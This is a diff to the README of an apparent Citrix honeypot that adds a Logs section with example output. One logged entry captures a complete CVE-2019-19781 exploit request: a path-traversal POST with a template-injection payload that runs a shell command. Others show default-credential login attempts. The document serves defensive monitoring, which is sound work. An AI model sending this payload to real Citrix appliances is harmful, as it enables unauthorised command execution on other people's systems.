@@ -38,6 +38,7 @@ Or to detach and run as a background process:
 nohup ./citrix-honeypot &
 ```
 
+## Logs
 Results / data is written to the `./log` directory. They are:
 
 `hits.log` - Scanning attempts and exploitation attempts with all data (e.g. headers, post body)
@@ -47,3 +48,31 @@ Results / data is written to the `./log` directory. They are:
 `logins.log` - Attempted logins to the web interface
 
 `tlsErrors.log` - Often internet scanners will send invalid data to port `443`. HTTPS errors are logged here.
+
+### Examples
+
+Running [the first public released exploit](https://github.com/projectzeroindia/CVE-2019-19781):
+```
+$ cat logs/hits.log 
+2020/01/23 08:27:55 
+-------------------
+Exploitation detected ...
+src: xxx.xxx.xxx.xxx
+POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/2.0
+Host: xxx.xxx.xxx.xxx
+Accept: */*
+Content-Length: 181
+Content-Type: application/x-www-form-urlencoded
+Nsc_nonce: test1337
+Nsc_user: /../../../../../../../../../../netscaler/portal/templates/zToMJRAzp0T0FuUS2cEp41ZZbmrtmUqS
+User-Agent: curl/7.67.0
+
+url=http://example.com\&title=[%25+template.new({'BLOCK'%3d'exec(\'id | tee /netscaler/portal/templates/zToMJRAzp0T0FuUS2cEp41ZZbmrtmUqS.xml\')%3b'})+%25]\&desc=test\&UI_inuse=RfWeb
+```
+
+Login attempts:
+```
+$ cat logs/logins.log
+2020/01/23 07:26:03 Failed login from xxx.xxx.xxx.xxx user:nsroot pass:nsroot
+2020/01/23 08:26:03 Failed login from xxx.xxx.xxx.xxx user:admin pass:admin
+```
